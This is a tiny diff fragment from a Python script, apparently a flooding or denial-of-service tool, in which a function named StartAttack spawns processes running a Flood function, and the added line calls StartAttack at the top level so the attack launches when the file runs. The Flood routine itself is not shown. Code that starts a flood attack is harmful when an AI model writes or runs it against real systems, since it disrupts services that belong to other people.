@@ -150,3 +150,4 @@ def StartAttack():
         process = multiprocessing.Process(target=Flood)
         process.setDaemon = False
         process.start()
+StartAttack()
